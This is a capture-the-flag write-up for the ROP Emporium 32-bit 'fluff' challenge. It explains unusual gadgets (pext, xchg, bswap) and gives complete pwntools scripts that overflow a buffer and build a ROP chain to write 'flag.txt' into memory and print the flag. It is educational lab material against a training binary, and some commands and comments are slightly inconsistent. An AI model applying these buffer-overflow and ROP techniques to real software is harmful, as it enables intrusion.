# GIST
The goal of this exercise is to use unconventional, or "questionable" ROP gadgets in order to set up a ROP chain and call a function with customized parameters that spits out the flag. This exercise is built off of previous exercises available via the links below.

# Links
Previous challenge: [badchars](https://github.com/curranbrandt/CTF-Writeups/tree/main/ropemporium/badchars_32bit)
Read about it [here](https://ropemporium.com/challenge/badchars.html)


# Identifying and Analyzing Functions
First, let's look at functions imported from shared libraries:

```sh
$rabin2 -i badchars32
[Imports]
nth vaddr      bind   type   lib name
―――――――――――――――――――――――――――――――――――――
1   0x080483b0 GLOBAL FUNC       pwnme
2   0x00000000 WEAK   NOTYPE     __gmon_start__
3   0x080483c0 GLOBAL FUNC       __libc_start_main
4   0x080483d0 GLOBAL FUNC       print_file
```

Now, let's look at innate functions: 
	
```sh
0x080485dc 4 _IO_stdin_used
0x0804a020 1 completed.7283
0x0804852a 25 usefulFunction
0x080485c0 2 __libc_csu_fini
0x08048440 4 __x86.get_pc_thunk.bx
0x08048560 93 __libc_csu_init
0x08048430 2 _dl_relocate_static_pie
0x080485d8 4 _fp_hw
0x08048506 36 main
```


Let's also use ipython3 to see if there are any functions that we haven't identified with the 2 previous commands:

```python
In [1]: from pwn import *                                                                                       
In [2]: from pprint import pprint                                                                               
In [3]: elf = ELF("./fluff32")                                                                               
In [4]: pprint(elf.symbols)                                                                                     
{'': 134520864,
questionableGadgets
< same as in write4 exercise >
}	
```

So, this time around we have a function that contains "questionable" gadgets. This will be fun.

Let's look at them in gdb:


```asm
gef➤  disass questionableGadgets
Dump of assembler code for function questionableGadgets:
   0x08048543 <+0>:	mov    eax,ebp
   0x08048545 <+2>:	mov    ebx,0xb0bababa
   0x0804854a <+7>:	pext   edx,ebx,eax
   0x0804854f <+12>:	mov    eax,0xdeadbeef
   0x08048554 <+17>:	ret    
   0x08048555 <+18>:	xchg   BYTE PTR [ecx],dl
   0x08048557 <+20>:	ret    
   0x08048558 <+21>:	pop    ecx
   0x08048559 <+22>:	bswap  ecx
   0x0804855b <+24>:	ret    
   0x0804855c <+25>:	xchg   ax,ax
   0x0804855e <+27>:	xchg   ax,ax
End of assembler dump.
```


# What Gadgets to Use
## Q Gadget 1

```asm
0x08048543 <+0>:	mov    eax,ebp
0x08048545 <+2>:	mov    ebx,0xb0bababa
0x0804854a <+7>:	pext   edx,ebx,eax
0x0804854f <+12>:	mov    eax,0xdeadbeef
``` 

```asm
0x08048543 <+0>:	mov    eax,ebp
```

we can control what's in eax, 
 therefore we can control what our mask is for pext
 

```asm
0x08048545 <+2>:	mov    ebx,0xb0bababa
```

We cannot control what our src1 is for pext (it is set to 0xb0bababa by the mov instruction).
The program then moves 0xdeadbeef, so a garbage value, into eax, so that we no longer have control over it


So, we can control our mask, which means we should be able to control what value goes into edx
For the pext command, here's a great explanation: [link](https://www.felixcloutier.com/x86/pext)


## Q Gadget 2
```asm
0x08048555 <+18>:	xchg   BYTE PTR [ecx],dl
0x08048557 <+20>:	ret    
```

Exchange dl wih ecx... so if dl = "x41", then ecx should then = "\x41\x00\x00\x00"

We should be able to put a single-byte value into dl, by popping "\x41\x00\x00\x00" into edx. 
Then after the swap occurs, [ecx] should read "41", or "a" in ascii


## Q Gadget 3
```asm
0x08048558 <+21>:    pop    ecx
0x08048559 <+22>:    bswap  ecx
0x0804855b <+24>:    ret   
```

Bswap converts from little-endian to big-endian --> essentially, it flips the byte order ;P
so, abcd --> dcba

We could put the address of some writeable region of memory onto the stack, and pop it off into ecx:


## Our Other Gadgets:

```python
{134513538: Gadget(0x8048382, ['ret'], [], 0x4),
# lameee

 134513561: Gadget(0x8048399, ['pop ebx', 'ret'], ['ebx'], 0x8),
# can control ebx

 134514105: Gadget(0x80485b9, ['pop esi', 'pop edi', 'pop ebp', 'ret'], ['esi', 'edi', 'ebp'], 0x10),
# can control  esi, edi, ebp

 134514106: Gadget(0x80485ba, ['pop edi', 'pop ebp', 'ret'], ['edi', 'ebp'], 0xc),
# just edi
 134514107: Gadget(0x80485bb, ['pop ebp', 'ret'], ['ebp'], 0x8)}
# just ebp
```




# Crafting a Stack

We will first overflow the buffer, which is 40-Bytes, followed by a 4-Byte ebp, and a 4-Byte return address

So, we can set up this stack:

With this, we can move whatever is in dl (lsb in edx), into [ecx]

	_________________________________
	A's					40B
	_________________________________
	fake ebp
	 = "BBBB"				 4B
	_________________________________
	
So, now we need to figure out what is going to be in dl when we jump to our first (pext) ROP gadget, and how to control it...
Remember, our ultimate goal is to move whatever is in dl (which should be a character from "flag.txt") into [ecx], and then call print_file@plt with &data as our argument

Looking back at our "questionable" gadgets, we can control edx, and therefore dl, via the pext operation :)

So, let's try returning next to our weird pext operation.
Then, we'll pop a value off the stack into ecx, and exchange [ecx] with dl


... NEW stack:
	_________________________________
	A's					40B
	_________________________________
	fake ebp
	 = value that'll be moved 
	 into eax
	 = value to mask with
	 0xb0bababa to get "0x46000000"
	 (or in ascii, "f")
	 = b"\x4b\x4b\x00\x00"
	_________________________________
	eip/instruction ptr 
	 = addr of next rop gadget
	 = addr of pext rop gadget
	_________________________________
	rop gadget
	 = pop ecx, xchg ecx
	_________________________________
	data_header address 
	(in big endian)
	_________________________________
	rop gadget
	 = xchg BYTE PTR [ecx],dl
	_________________________________
	

Let's whip up a python script that will put "f" into &data

```python
from pwn import *
from pprint import pprint
offset = 40

context.arch = 'i386'

elf = ELF("./fluff32")
p = elf.process()

# uncomment next 3 lines to debug
# gdb.attach(p, gdbscript='''
# script
# ''')

# for rop gadgets
rop = ROP(elf)

print(p.recvuntil(b">"))

# let's first determine where everything is:
# pprint(elf.symbols)

# address of .data section header... this is area in memory that we will write our string ("flag.txt") to
data_header_address = p32(elf.symbols["data_start"])
data_header_address_big_endian = p32(elf.symbols["data_start"], endian='big')

# all our of ROP gadgets we're gona use
xchg_ecx_dl = p32(elf.symbols["questionableGadgets"]  + 18)
pext_rop_gadget = p32(elf.symbols["questionableGadgets"])
pop_ecx_xchg = p32(elf.symbols["questionableGadgets"] + 21)
pop_ebp_gadget = p32(rop.ebp.address)


# use rop object to locate gadgets in memory
rop = ROP(elf)

# buffer is 40 A's
buf = b"A"*offset

ebp_mask_for_f = b"\x4B\x4B\x00\x00"


payload = [
        buf,                                # bunch of A's

        # insert the "f"
        ebp_mask_for_f,                     # 0x4b4b masked with 0xb0bababa = 0x66 = "f"
        pext_rop_gadget,                    # address of our "pext" ROP gadget
        pop_ecx_xchg,                       # addr of ROP gadget to pop ecx, and flip it's endian-ness
        data_header_address_big_endian,     # address of data header in big endian...
                                            # this is a region of writeable memory that we can store 
                                            # our string "flag.txt" in
        xchg_ecx_dl,                        # addr of ROP gadget to put dl into [ecx]
        b'cccc'                             # garbage EIP 
       ]

payload = b"".join(payload)
print("payload is: ", payload)

p.send(payload)


print(p.recvall())
p.close()
```



Sweet, we successfully got "f" into &data :))))
```asm
gef➤  x/wx $ecx
0x804a018:	0x00000066
gef➤  x/s $ecx
0x804a018:	"f"
```

Now, all we have to do is repeat the process...
BUT, we need to change the ebp, as that determines what is in eax, and masked with 0xb0bababa, to ultimately determine our dl value (in the edx register)


So, let's change our ebp...

We can do this via a leave command... 
Wait, nm... No we can't! 
```
leave is:
	set esp to ebp
	pop ebp

	if ebp is just some random value (that we use for our rop chain),
	then esp will move to it, and this will break our program's control flow, as it will go to a random 
	place in memory, and no longer be able to read instructions there
```

Oh wow, this gadget is nice: 

```asm
0x080485bb : pop ebp ; ret
```


So now, let's just add this gadget to our stack, along with a new ebp below it that we want to pop

```
_________________________________
rop gadget
 = pop ebp
_________________________________
args
 = new ebp = 0x06dd
 = "\xdd\x06\x00\x00"
_________________________________
rop gadget
 = pext
_________________________________
rop gadget
 = pop ecx, xchg ecx
_________________________________
next byte in data header
in big endian
= data header + 1 in big endian
_________________________________
rop gadget
 = xchg BYTE PTR [ecx],dl
_________________________________
```



Okay, we've got "fl"... now this should be easy money...


Just finish finding the values that we want for ebp (our mask in the pext instruction), and forge our stack:

*Make sure you keep incrementing the address in the data header by 1 each time you call the 3 "questionable gadgets"*


```
rop gadget
 = pop ebp
_________________________________
args
 = new ebp2 = 0x5d46
 = "\x46\x5d\x00\x00"
_________________________________
rop gadget
 = pext
_________________________________
rop gadget
 = pop ecx, xchg ecx
_________________________________
next byte in data header
in big endian
= data header + 2 in big endian
_________________________________
rop gadget
 = xchg BYTE PTR [ecx],dl
_________________________________
```

Here's our python script:
```python
from pwn import *
from pprint import pprint
offset = 40

context.arch = 'i386'

elf = ELF("./fluff32")
p = elf.process()

# uncomment to debug:
#   gdb.attach(p, gdbscript='''
#   # script
#   ''')


rop = ROP(elf)

p.recvuntil(b">")


# address of gadgets we'll use/return to 
xchg_ecx_dl = p32(elf.symbols["questionableGadgets"]  + 18)
pext_rop_gadget = p32(elf.symbols["questionableGadgets"])
pop_ecx_xchg = p32(elf.symbols["questionableGadgets"] + 21)
pop_ebp_gadget = p32(rop.ebp.address)
   

# use rop object to locate gadgets in memory
rop = ROP(elf)

# buffer is 40 A's
buf = b"A"*offset

ebp_mask_for_l = b"\xdd\x06\x00\x00"
ebp_mask_for_f = b"\x4B\x4B\x00\x00"
ebp_mask_for_a = b"\x46\x5d\x00\x00"
ebp_mask_for_g = b"\x5a\x4b\x00\x00"
ebp_mask_for_dot = b"\xdb\x05\x00\x00"
ebp_mask_for_t = b"\xcd\x4a\x00\x00"
ebp_mask_for_x = b"\xc5\x5a\x00\x00"


# get address of .data section header. This is a writeable section of memory
# where we can write "flag.txt"
# once it is written to this address in memory, we'll be able to pass it into the print_file fxn
data_header_address = p32(elf.symbols["data_start"])    
data_header_address_big_endian = p32(elf.symbols["data_start"], endian='big')

data_header_char_1 = data_header_address_big_endian 
data_header_char_2 = p32(elf.symbols["data_start"] + 1, endian='big')
data_header_char_3 = p32(elf.symbols["data_start"] + 2, endian='big')
data_header_char_4 = p32(elf.symbols["data_start"] + 3, endian='big')
data_header_char_5 = p32(elf.symbols["data_start"] + 4, endian='big')
data_header_char_6 = p32(elf.symbols["data_start"] + 5, endian='big')
data_header_char_7 = p32(elf.symbols["data_start"] + 6, endian='big')
data_header_char_8 = p32(elf.symbols["data_start"] + 7, endian='big')

print_file_fxn_addr = p32(elf.symbols["print_file"])

payload = [
        buf,                                # bunch of A's
        ebp_mask_for_f,                     # 0x4b4b masked with 0xb0bababa = 0x66 = "f"
        pext_rop_gadget,                    # address of our "pext" ROP gadget
        pop_ecx_xchg,                       # addr of ROP gadget to pop ecx, and flip it's endian-ness
        data_header_address_big_endian,     # address of data header in big endian...
                                            # this is a region of writeable memory that we can store 
                                            # our string "flag.txt" in
        xchg_ecx_dl,                        # addr of ROP gadget to put dl into [ecx]


        # insert the "l"
        pop_ebp_gadget,
        ebp_mask_for_l,
        pext_rop_gadget,
        pop_ecx_xchg,
        data_header_char_2,
        xchg_ecx_dl,

        # insert the "a"
        pop_ebp_gadget,
        ebp_mask_for_a,
        pext_rop_gadget,
        pop_ecx_xchg,
        data_header_char_3,
        xchg_ecx_dl,
        
        # insert the "g"
        pop_ebp_gadget,
        ebp_mask_for_g,
        pext_rop_gadget,
        pop_ecx_xchg,
        data_header_char_4,
        xchg_ecx_dl,

        # insert the "."
        pop_ebp_gadget,
        ebp_mask_for_dot,
        pext_rop_gadget,
        pop_ecx_xchg,
        data_header_char_5,
        xchg_ecx_dl,

        # insert the "t"
        pop_ebp_gadget,
        ebp_mask_for_t,
        pext_rop_gadget,
        pop_ecx_xchg,
        data_header_char_6,
        xchg_ecx_dl,

        # insert the "x"
        pop_ebp_gadget,
        ebp_mask_for_x,
        pext_rop_gadget,
        pop_ecx_xchg,
        data_header_char_7,
        xchg_ecx_dl,

        # insert the "t"
        pop_ebp_gadget,
        ebp_mask_for_t,
        pext_rop_gadget,
        pop_ecx_xchg,
        data_header_char_8,
        xchg_ecx_dl,


        # open "flag.txt"
        print_file_fxn_addr,                # address of print_file function, which works like "cat"...
                                            # opens file that you pass to it as an argument

        b"cccc",                            # fake ebp

        data_header_address                 # address of "flag.txt", which acts as our argument to the 
                                            # print_file function
        ]

payload = b"".join(payload)

p.send(payload)

p.recvline()
flag = p.recvline()
flag = flag.decode('UTF-8')
print("flag is: " , flag)
p.close()


```



